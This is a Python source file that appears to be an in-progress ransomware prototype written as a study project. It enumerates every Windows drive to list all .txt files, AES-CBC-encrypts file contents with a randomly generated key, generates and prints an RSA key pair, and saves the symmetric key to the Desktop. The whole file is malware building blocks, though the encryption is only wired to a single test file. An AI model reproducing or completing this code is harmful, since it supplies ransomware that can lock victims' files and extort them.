import random, os, string
import win32api
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA


def generate_key(length):
    """Generate a random ASCII key of given length"""
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return key

def findRootDirsWindows():
    """Find the root directories in Windows"""
    drives = win32api.GetLogicalDriveStrings()
    roots = drives.split('\000')[:-1]
    return roots

def findTxtFile():
    """Find all text files in the system and write their paths to a .txt file"""
    root_dirs = findRootDirsWindows()
    for root_dir in root_dirs:
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    # Write file_path to a .txt file
                    with open("file_paths.txt", "a") as f:
                        f.write(file_path + "\n")


def pad_data(data):
    """Pad the data to be 16-byte for encryption"""
    pad_len = 16 - len(data) % 16
    bytes_data = bytes([pad_len] * pad_len)
    my_bytes = data.encode()
    return my_bytes + bytes_data

def encrypt_data(key, data):
    """Encrypt the data using AES-CBC"""
    print(key)
    iv = os.urandom(16)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad_data(data))
    return iv + encrypted_data

def generateRSAKeys():
    """Generate an RSA key pair"""
    # Generate an RSA key pair with a key length of 2048 bits
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    print("Private key:\n", private_key.decode())
    print("\nPublic key:\n", public_key.decode())

def saveKey(key):
    # Define the path to the desktop folder
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop_path):
        print(f"The desktop directory {desktop_path} does not exist!")
    else:
        filename = "Key.key"
        content = key
        with open(os.path.join(desktop_path, filename), "w") as file:
            file.write(content)

def testEncryption():
    file_path = r'E:\Study\ransomware\file_test.txt'
    key = generate_key(16)
    with open(file_path, 'r') as f:
        data = f.read()
    encrypted_data = encrypt_data(key, data)
    with open('encrypted_file', 'wb') as f:
        f.write(encrypted_data)
    saveKey(key)

